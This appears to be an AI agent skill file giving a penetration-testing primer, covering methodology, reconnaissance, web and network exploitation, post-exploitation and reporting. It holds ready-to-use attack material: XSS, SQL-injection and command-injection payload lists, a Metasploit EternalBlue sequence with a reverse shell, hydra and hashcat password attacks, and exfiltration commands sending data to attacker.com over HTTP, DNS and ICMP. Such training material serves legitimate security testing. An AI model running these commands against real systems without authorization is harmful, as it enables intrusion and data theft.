---
name: penetration-testing-basics
description: Foundational penetration testing methodology, tools, and techniques. Covers reconnaissance, exploitation, post-exploitation, and reporting for ethical hacking engagements.
triggers:
  - /pentest
  - /penetration-test
  - /ethical-hacking
  - /security-test
useCases:
  - "Testing application security"
  - "Network vulnerability assessment"
  - "Red team exercises"
  - "CTF challenges"
tags:
  - security
  - penetration-testing
  - ethical-hacking
  - red-team
---

# Penetration Testing Basics

## Methodology Framework

### PTES (Penetration Testing Execution Standard)

```
1. Pre-Engagement Interactions
   - Scoping call
   - Rules of engagement
   - Legal agreements
   - Payment terms

2. Intelligence Gathering
   - OSINT
   - Network enumeration
   - Social engineering

3. Threat Modeling
   - Attack vectors
   - Target prioritization

4. Vulnerability Analysis
   - Active testing
   - Passive scanning

5. Exploitation
   - Initial access
   - Privilege escalation

6. Post-Exploitation
   - Lateral movement
   - Data exfiltration

7. Reporting
   - Executive summary
   - Technical findings
   - Remediation
```

## Reconnaissance Phase

### Passive Information Gathering

```bash
# Domain reconnaissance
whois example.com
dig example.com ANY
sublist3r -d example.com

# Email harvesting
theHarvester -d example.com -b all

# Social media OSINT
maltego
recon-ng
```

### Active Enumeration

```python
# Nmap scanning scripts
SCAN_CONFIG = {
    "quick_scan": "nmap -T4 -F target.com",
    "full_scan": "nmap -sS -sV -sC -O -p- target.com",
    "aggressive": "nmap -A -T4 -p- target.com",
}
```

## Vulnerability Assessment

### Common Vulnerabilities Checklist

| Category | Issue | CVSS | Testing Method |
|----------|-------|------|----------------|
| Injection | SQLi, XSS, Command | 9.8 | Manual + Burp |
| Auth | Weak passwords, MFA bypass | 8.1 | Hydra, Manual |
| Secrets | API keys, tokens exposed | 9.1 | Gitrob, TruffleHog |
| Config | Default creds, open ports | 7.5 | Nmap, Nessus |
| Crypto | Weak TLS, bad random | 7.4 | TestSSL, OpenSSL |

### Exploitation Tools

```bash
# Web application testing
sqlmap -u "http://target.com/?id=1" --batch --dbs
nikto -h http://target.com
dirb http://target.com /usr/share/wordlists/dirb/*.txt

# Network exploitation
msfconsole
search type:exploit name:smb
use exploit/windows/smb/eternalblue
set RHOSTS target.com
exploit

# Password attacks
hashcat -m 1000 hashes.txt wordlist.txt
hydra -l admin -P passwords.txt ssh://target.com
```

## Exploitation Techniques

### Web Application

```python
# XSS Payloads
XSS_PAYLOADS = [
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert('XSS')>",
    "{{constructor.constructor('alert(1)')()}}",
]

# SQL Injection
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE users;--",
    "1 UNION SELECT NULL,NULL,NULL--",
    "1' AND SLEEP(5)--",
]

# Command Injection
CMDI_PAYLOADS = [
    "; cat /etc/passwd",
    "| whoami",
    "`id`",
    "$(whoami)",
]
```

### Network Exploitation

```bash
# SMB exploitation (EternalBlue example)
nmap --script smb-vuln* -p 445 target.com
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target.com
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST your_ip
exploit
```

## Post-Exploitation

### Privilege Escalation

```bash
# Linux enumeration
whoami && id
sudo -l
cat /etc/passwd
find / -perm -4000 2>/dev/null
linpeas.sh

# Windows enumeration
whoami /all
systeminfo
wmic qfe get Caption,Description,KBNumber,InstalledOn
winpeas.exe
```

### Lateral Movement

```bash
# Pivoting
proxychains nmap -sT internal_network
ssh -L 8080:remote:80 user@pivot.com
sshuttle -r user@pivot.com 10.0.0.0/24
```

### Data Exfiltration

```python
# Encrypted exfil
EXFIL_COMMANDS = {
    "http": "curl -X POST -d @data.txt http://attacker.com/exfil",
    "dns": "dig txt $(cat data.txt | base64).attacker.com",
    "icmp": "ping -p $(cat data.txt | xxd -p) attacker.com",
}
```

## Reporting

### Finding Template

```markdown
## Finding: [Title]

**Severity**: Critical | High | Medium | Low | Info
**CVSS Score**: [X.X]
**CVSS Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

### Description
[What the vulnerability is]

### Impact
[Business impact if exploited]

### Steps to Reproduce
1. [Step 1]
2. [Step 2]

### Proof of Concept
```[code/command]```

### Remediation
[How to fix]

### References
- [CVE-XXXX-XXXX]
- [OWASP Top 10]
```

## Legal & Ethical Considerations

```yaml
rules_of_engagement:
  must_have:
    - Written authorization
    - Defined scope (IPs, URLs)
    - Emergency contacts
    - Escalation procedures
  
  never_do:
    - Exceed scope
    - Test DoS without notice
    - Social engineering outside scope
    - Exfiltrate real data
```

## Essential Tools Summary

| Phase | Tools | Purpose |
|-------|-------|---------|
| Recon | Nmap, Amass, Sublist3r | Discovery |
| Scanning | Nessus, OpenVAS, Nikto | Vulnerability scan |
| Exploitation | Metasploit, Burp, SQLMap | Attack execution |
| Post-Exploit | Meterpreter, Empire, Cobalt Strike | Persistence |
| Reporting | Dradis, Faraday, Obsidian | Documentation |
```
